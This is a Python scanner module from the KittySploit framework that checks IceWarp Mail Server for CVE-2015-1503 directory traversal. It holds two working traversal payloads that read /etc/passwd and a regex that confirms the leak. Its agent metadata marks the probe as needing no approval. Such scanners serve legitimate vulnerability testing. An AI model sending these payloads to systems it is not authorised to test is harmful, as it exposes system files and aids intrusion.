#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IceWarp Mail Server versions prior to 11."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IceWarp Mail Server <11.1.1 - Directory Traversal Detection',
        'description': 'IceWarp Mail Server versions prior to 11.1.1 suffer from a directory traversal vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2015', 'lfi', 'mail', 'packetstorm', 'icewarp', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://packetstormsecurity.com/files/147505/IceWarp-Mail-Server-Directory-Traversal.html',
            'http://www.icewarp.com',
            'https://nvd.nist.gov/vuln/detail/CVE-2015-1503',
            'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2015-001/?fid=5614',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2015-1503',
    }

    def run(self):
        for path in ('/webmail/old/calendar/minimizer/index.php?script=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd', '/webmail/old/calendar/minimizer/index.php?style=...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2f...%2f.%2fetc%2fpasswd'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            body_regexes = ('root:[x*]:0:0',)
            if (any(re.search(rx, body, 0) for rx in body_regexes)):
                self.set_info(
                    severity='high',
                    reason="IceWarp Mail Server <11.1.1 - Directory Traversal detected",
                    path=path,
                )
                return True
        return False

